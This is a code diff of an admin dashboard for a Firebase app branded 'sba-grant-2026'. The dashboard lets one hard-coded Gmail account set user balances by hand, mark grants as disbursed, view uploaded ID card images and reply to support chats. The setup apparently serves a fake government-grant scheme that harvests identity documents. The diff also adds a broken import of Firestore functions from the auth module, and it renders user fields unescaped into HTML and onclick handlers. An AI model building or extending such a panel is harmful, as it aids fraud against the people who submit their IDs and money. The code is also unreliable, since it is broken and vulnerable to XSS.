@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -36,7 +37,7 @@
         
         .action-btn { background: #10b981; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; font-size: 11px; }
         .math-btn { background: #38bdf8; color: #0f172a; border: none; font-size: 10px; padding: 8px 10px; border-radius: 6px; position: absolute; right: 15px; top: 15px; font-weight: 900; }
-        .view-btn { display: inline-block; background: #64748b; color: white; padding: 8px 15px; text-decoration: none; border-radius: 6px; font-size: 11px; margin: 5px 5px 10px 0; }
+        .view-btn { display: inline-block; background: #64748b; color: white; padding: 8px 15px; text-decoration: none; border-radius: 6px; font-size: 11px; margin: 5px 5px 10px 0; border:none; cursor:pointer;}
     </style>
 </head>
 <body>
@@ -66,8 +67,10 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, collection, onSnapshot, query, orderBy, addDoc, serverTimestamp, doc, deleteDoc, updateDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, collection, onSnapshot, query, orderBy, addDoc, serverTimestamp, doc, deleteDoc, updateDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore as getDb, collection as col, onSnapshot as onSnap, query as q, orderBy as ord, addDoc as add, serverTimestamp as time, doc as dRef, updateDoc as update, getDoc as get } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
+        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
             authDomain: "sba-grant-2026.firebaseapp.com",
@@ -79,7 +82,7 @@
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
-        const db = getFirestore(app);
+        const db = getDb(app);
 
         onAuthStateChanged(auth, (user) => {
             if (user && user.email === "liger4683@gmail.com") {
@@ -87,7 +90,8 @@
             } else { window.location.href = "index.html"; }
         });
 
-        onSnapshot(collection(db, "users"), (snap) => {
+        // 1. USERS LISTENER
+        onSnap(col(db, "users"), (snap) => {
             const list = document.getElementById('userList');
             let total = 0; 
             list.innerHTML = "";
@@ -120,12 +124,13 @@
             if (isNaN(change)) { alert("Invalid number!"); return; }
             const newTotal = currentBal + change;
             try {
-                await updateDoc(doc(db, "users", uid), { balance: newTotal });
+                await update(dRef(db, "users", uid), { balance: newTotal });
                 alert(`Updated! New Balance: $${newTotal.toLocaleString()}`);
             } catch (e) { alert("Error: " + e.message); }
         };
 
-        onSnapshot(collection(db, "requests"), (snap) => {
+        // 2. ACTION STREAM
+        onSnap(col(db, "requests"), (snap) => {
             const feed = document.getElementById('requestFeed');
             let pCount = 0;
             feed.innerHTML = "";
@@ -137,10 +142,10 @@
                 feed.innerHTML += `
                     <div class="req-item">
                         <small>REQ ID: ${d.id.substring(0,8)}</small>
-                        <b style="display:block; font-size:16px; margin:5px 0;">${r.type}</b>
+                        <b style="display:block; font-size:16px; margin:5px 0; color:var(--admin-blue);">${r.type}</b>
                         <p style="margin:0; font-size:12px;">Client: ${r.userName}</p>
                         <h2 style="margin:10px 0; color:var(--admin-red);">$${r.amount ? parseFloat(r.amount).toLocaleString() : '0.00'}</h2>
-                        ${isKyc ? `<a href="${r.frontImg}" target="_blank" class="view-btn">ID FRONT</a><a href="${r.backImg}" target="_blank" class="view-btn" style="background:var(--admin-red)">ID BACK</a>` : ''}
+                        ${isKyc ? `<button onclick="window.open('${r.frontImg}')" class="view-btn">ID FRONT</button><button onclick="window.open('${r.backImg}')" class="view-btn" style="background:var(--admin-red)">ID BACK</button>` : ''}
                         <div style="display:flex; gap:10px;">
                             <button onclick="approveReq('${d.id}', '${r.userId}', '${r.type}')" class="action-btn">APPROVE</button>
                             <button onclick="rejectReq('${d.id}', '${r.userId}', '${r.type}')" class="action-btn" style="background:#64748b">REJECT</button>
@@ -151,59 +156,57 @@
         });
 
         window.approveReq = async (docId, uid, type) => {
-            const userRef = doc(db, "users", uid);
-            const reqRef = doc(db, "requests", docId);
+            const userRef = dRef(db, "users", uid);
+            const reqRef = dRef(db, "requests", docId);
             try {
-                const reqSnap = await getDoc(reqRef);
+                const reqSnap = await get(reqRef);
                 const reqData = reqSnap.data();
                 const amtToApprove = parseFloat(reqData.amount) || 0;
 
                 if(type.includes("KYC")) {
-                    await updateDoc(userRef, { kycStatus: "APPROVED", status: "IDENTITY VERIFIED" });
-                    await updateDoc(reqRef, { status: "APPROVED" });
+                    await update(userRef, { kycStatus: "APPROVED", status: "IDENTITY VERIFIED" });
+                    await update(reqRef, { status: "APPROVED" });
                 } 
-                else if(type === "GRANT_APPLICATION" || type.includes("APPLY")) {
-                    const userSnap = await getDoc(userRef);
+                else if(type.includes("APPLY") || type.includes("GRANT")) {
+                    const userSnap = await get(userRef);
                     const currentBal = parseFloat(userSnap.data().balance) || 0;
-                    await updateDoc(userRef, { balance: currentBal + amtToApprove, status: "GRANT DISBURSED" });
-                    await updateDoc(reqRef, { status: "SUCCESSFUL" });
+                    await update(userRef, { balance: currentBal + amtToApprove, status: "GRANT DISBURSED" });
+                    await update(reqRef, { status: "SUCCESSFUL" });
                 }
                 else {
-                    await updateDoc(userRef, { status: "COMPLETED" });
-                    await updateDoc(reqRef, { status: "SUCCESSFUL" });
+                    await update(userRef, { status: "COMPLETED" });
+                    await update(reqRef, { status: "SUCCESSFUL" });
                 }
                 alert("SUCCESSFULLY APPROVED");
             } catch (e) { alert("Error: " + e.message); }
         };
 
-        // FIXED REJECT LOGIC
         window.rejectReq = async (docId, uid, type) => {
             if(!confirm("Decline this request?")) return;
-            const userRef = doc(db, "users", uid);
-            const reqRef = doc(db, "requests", docId);
+            const userRef = dRef(db, "users", uid);
+            const reqRef = dRef(db, "requests", docId);
             try {
-                const reqSnap = await getDoc(reqRef);
+                const reqSnap = await get(reqRef);
                 const r = reqSnap.data();
 
                 if(type.includes("TRANSFER") || type.includes("WIRE")) {
                     const amt = parseFloat(r.amount) || 0;
-                    const userSnap = await getDoc(userRef);
+                    const userSnap = await get(userRef);
                     const currentBal = parseFloat(userSnap.data().balance) || 0;
-                    // REFUND MONEY
-                    await updateDoc(userRef, { balance: currentBal + amt, status: "TRANSFER DECLINED" });
+                    await update(userRef, { balance: currentBal + amt, status: "TRANSFER DECLINED" });
                 } else if(type.includes("KYC")) {
-                    await updateDoc(userRef, { kycStatus: "REJECTED", status: "ID VERIFIED FAILED" });
+                    // This is the important part for unlocking the form
+                    await update(userRef, { kycStatus: "REJECTED", status: "ID VERIFIED FAILED" });
                 } else {
-                    await updateDoc(userRef, { status: "DECLINED" });
+                    await update(userRef, { status: "DECLINED" });
                 }
-
-                // CHANGE STATUS INSTEAD OF DELETE
-                await updateDoc(reqRef, { status: "DECLINED" });
-                alert("REQUEST DECLINED & SAVED TO HISTORY");
+                await update(reqRef, { status: "DECLINED" });
+                alert("REQUEST DECLINED & SAVED");
             } catch (e) { alert("Error: " + e.message); }
         };
 
-        onSnapshot(query(collection(db, "support_tickets"), orderBy("timestamp", "asc")), (snapshot) => {
+        // 3. CHAT
+        onSnap(q(col(db, "support_tickets"), ord("timestamp", "asc")), (snapshot) => {
             const chatFeed = document.getElementById('chatFeed');
             const groups = {};
             snapshot.forEach(snap => {
@@ -231,7 +234,7 @@
         window.sendReply = async (uid, name) => {
             const val = document.getElementById(`input-${uid}`).value;
             if(!val) return;
-            await addDoc(collection(db, "support_tickets"), { userId: uid, userName: name, message: val, sender: "ADMIN", timestamp: serverTimestamp() });
+            await add(col(db, "support_tickets"), { userId: uid, userName: name, message: val, sender: "ADMIN", timestamp: time() });
             document.getElementById(`input-${uid}`).value = "";
         };
     </script>
